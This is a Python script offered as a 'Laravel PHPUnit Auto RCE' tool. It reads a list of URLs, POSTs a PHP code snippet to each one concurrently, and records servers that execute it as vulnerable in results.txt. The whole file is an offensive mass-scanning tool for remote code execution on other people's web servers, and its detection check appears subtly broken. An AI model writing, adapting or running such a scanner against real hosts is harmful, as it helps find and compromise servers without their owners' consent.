import requests
import threading

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def banner():
    print (bcolors.OKGREEN + '''
    Laravel PHPUnit Auto RCE
          tikusgot.org
    ''' + bcolors.ENDC)

def rceScan(url):
    payload = "<?php echo 'tikusgot.org'; ?>"
    try:
        r = requests.post(url, data = payload, timeout=10)

        if b"tikusgot.org" in r:
            print(f"[+] {url} => {bcolors.OKCYAN}Vuln!{bcolors.ENDC}")
            s = open("results.txt","a")
            s.write(f"{url}\n")
            s.close()
        else:
            print(f"[+] {url} => {bcolors.FAIL}Not Vuln!{bcolors.ENDC}")
    except:
        pass

banner()

i = input(f"[{bcolors.WARNING}?{bcolors.ENDC}] Your list: ")
o = open(i,"r")

threads = []
for url in o:
    url = url.strip()
    t = threading.Thread(target=rceScan, args=(url,))
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
